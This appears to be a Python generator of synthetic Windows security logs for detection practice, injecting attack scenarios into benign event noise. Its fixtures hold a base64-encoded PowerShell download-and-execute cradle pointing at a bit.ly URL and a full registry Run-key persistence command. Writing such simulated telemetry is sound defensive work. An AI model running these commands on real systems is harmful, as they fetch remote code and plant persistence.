import json
import random
import hashlib
from datetime import datetime, timedelta, timezone
from pathlib import Path

from faker import Faker

fake = Faker()

OUT_DIR = Path("data/raw")
OUT_DIR.mkdir(parents=True, exist_ok=True)
OUT_FILE = OUT_DIR / "events.jsonl"

USERS = ["ryan", "admin", "svc-backup", "svc-deploy"]
DEVICES = ["WIN10-LAB", "ENG-WKS01", "FIN-WKS02", "SRV-FILE01"]

BENIGN_PROCS = [
    r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\svchost.exe",
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    r"C:\Windows\System32\notepad.exe",
]

SUSP_PROCS = [
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
]

BENIGN_DOMAINS = ["microsoft.com", "github.com", "office.com", "windowsupdate.com"]
SUSP_DOMAINS = ["pastebin.com", "raw.githubusercontent.com", "cdn.discordapp.com", "bit.ly"]

RUN_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

def iso_utc(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")

def rand_sha256() -> str:
    return hashlib.sha256(fake.uuid4().encode()).hexdigest()

def rand_ip() -> str:
    return fake.ipv4_public()

def base_event(ts: datetime, device: str, user: str, event_type: str, severity="Informational", scenario="benign"):
    return {
        "TimeGenerated": iso_utc(ts),
        "DeviceName": device,
        "User": user,
        "EventType": event_type,
        "Severity": severity,
        "Scenario": scenario,
        "Process": {},
        "Network": {},
        "File": {},
        "Registry": {},
        "Auth": {}
    }

def benign_noise(ts: datetime):
    """Generate a single benign event."""
    device = random.choice(DEVICES)
    user = random.choice(USERS)
    et = random.choice(["ProcessCreate", "NetworkConnect", "Logon", "FileCreate"])

    if et == "ProcessCreate":
        img = random.choice(BENIGN_PROCS)
        parent = r"C:\Windows\explorer.exe"
        e = base_event(ts, device, user, et)
        e["Process"] = {
            "Image": img,
            "CommandLine": img,
            "ParentImage": parent,
            "SHA256": rand_sha256(),
            "IntegrityLevel": random.choice(["Medium", "High"])
        }
        return e

    if et == "NetworkConnect":
        e = base_event(ts, device, user, et)
        e["Network"] = {
            "DestIP": rand_ip(),
            "DestPort": random.choice([80, 443, 8080, 53]),
            "Domain": random.choice(BENIGN_DOMAINS),
            "Protocol": "TCP"
        }
        e["Process"] = {
            "Image": random.choice(BENIGN_PROCS),
            "CommandLine": "",
            "ParentImage": "",
            "SHA256": rand_sha256(),
            "IntegrityLevel": "Medium"
        }
        return e

    if et == "Logon":
        e = base_event(ts, device, user, et)
        e["Auth"] = {
            "LogonResult": random.choice(["Success", "Failure"]),
            "LogonType": random.choice(["Interactive", "Remote", "Service"]),
            "SourceIP": rand_ip()
        }
        return e

    # FileCreate
    e = base_event(ts, device, user, "FileCreate")
    e["File"] = {
        "Path": str(Path(r"C:\Users") / user / "Documents" / f"{fake.word()}.docx"),
        "Operation": "Create"
    }
    e["Process"] = {
        "Image": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "CommandLine": "",
        "ParentImage": r"C:\Windows\explorer.exe",
        "SHA256": rand_sha256(),
        "IntegrityLevel": "Medium"
    }
    return e

def scenario_powershell_encoded(start: datetime):
    """Office -> PowerShell -enc -> network connect"""
    device = random.choice(DEVICES)
    user = "ryan"
    events = []

    # WINWORD launches PowerShell
    ts1 = start
    e1 = base_event(ts1, device, user, "ProcessCreate", severity="Medium", scenario="powershell_encoded")
    e1["Process"] = {
        "Image": SUSP_PROCS[1],
        "CommandLine": r"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBiAGkAdAAuAGwAeQAvAHgAeAAnACkA",
        "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "SHA256": rand_sha256(),
        "IntegrityLevel": "Medium"
    }
    events.append(e1)

    # Network connect shortly after
    ts2 = start + timedelta(seconds=8)
    e2 = base_event(ts2, device, user, "NetworkConnect", severity="High", scenario="powershell_encoded")
    e2["Process"] = {
        "Image": SUSP_PROCS[1],
        "CommandLine": "",
        "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "SHA256": e1["Process"]["SHA256"],
        "IntegrityLevel": "Medium"
    }
    e2["Network"] = {
        "DestIP": rand_ip(),
        "DestPort": 443,
        "Domain": random.choice(SUSP_DOMAINS),
        "Protocol": "TCP"
    }
    events.append(e2)

    return events

def scenario_password_spray(start: datetime):
    """Many failed logons from same IP, then a success."""
    device = random.choice(DEVICES)
    source_ip = rand_ip()
    events = []
    target_users = ["ryan", "admin", "svc-deploy", "svc-backup"]

    for i in range(12):
        ts = start + timedelta(seconds=i * 12)
        user = random.choice(target_users)
        e = base_event(ts, device, user, "Logon", severity="Medium", scenario="password_spray")
        e["Auth"] = {
            "LogonResult": "Failure",
            "LogonType": "Remote",
            "SourceIP": source_ip
        }
        events.append(e)

    # one success
    ts_s = start + timedelta(seconds=12 * 12)
    e_s = base_event(ts_s, device, "admin", "Logon", severity="High", scenario="password_spray")
    e_s["Auth"] = {
        "LogonResult": "Success",
        "LogonType": "Remote",
        "SourceIP": source_ip
    }
    events.append(e_s)
    return events

def scenario_persistence_runkey(start: datetime):
    """Registry Run key set to persist."""
    device = random.choice(DEVICES)
    user = "ryan"
    events = []

    ts1 = start
    e1 = base_event(ts1, device, user, "RegistrySet", severity="High", scenario="persistence_runkey")
    e1["Registry"] = {
        "Key": RUN_KEY,
        "ValueName": "Updater",
        "ValueData": r"C:\Users\ryan\AppData\Roaming\updater.exe"
    }
    e1["Process"] = {
        "Image": r"C:\Windows\System32\reg.exe",
        "CommandLine": r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d C:\Users\ryan\AppData\Roaming\updater.exe /f',
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "SHA256": rand_sha256(),
        "IntegrityLevel": "Medium"
    }
    events.append(e1)

    # file dropped
    ts2 = start + timedelta(seconds=5)
    e2 = base_event(ts2, device, user, "FileCreate", severity="High", scenario="persistence_runkey")
    e2["File"] = {"Path": r"C:\Users\ryan\AppData\Roaming\updater.exe", "Operation": "Create"}
    e2["Process"] = {"Image": r"C:\Windows\System32\cmd.exe", "CommandLine": "", "ParentImage": r"C:\Windows\explorer.exe", "SHA256": rand_sha256(), "IntegrityLevel": "Medium"}
    events.append(e2)

    return events

def main(total_events=20000, attack_injections=12):
    start = datetime.now(timezone.utc) - timedelta(hours=24)
    events = []

    # background benign noise
    for i in range(total_events):
        ts = start + timedelta(seconds=random.randint(0, 24 * 3600))
        events.append(benign_noise(ts))

    # inject scenarios
    for _ in range(attack_injections):
        base_ts = start + timedelta(seconds=random.randint(0, 24 * 3600))
        scenario = random.choice([scenario_powershell_encoded, scenario_password_spray, scenario_persistence_runkey])
        events.extend(scenario(base_ts))

    # sort by time
    events.sort(key=lambda e: e["TimeGenerated"])

    with OUT_FILE.open("w", encoding="utf-8") as f:
        for e in events:
            f.write(json.dumps(e) + "\n")

    print(f"Wrote {len(events)} events to {OUT_FILE}")

def generate(total_events=20000, attack_injections=12, out_file=None):
    """
    Programmatic entrypoint for Streamlit.
    """
    global OUT_FILE
    if out_file:
        OUT_FILE = Path(out_file)
        OUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    main(total_events=total_events, attack_injections=attack_injections)

def generate(total_events=20000, attack_injections=12):
    """
    Programmatic entrypoint for Streamlit UI.
    """
    main(total_events=total_events, attack_injections=attack_injections)

if __name__ == "__main__":
    main()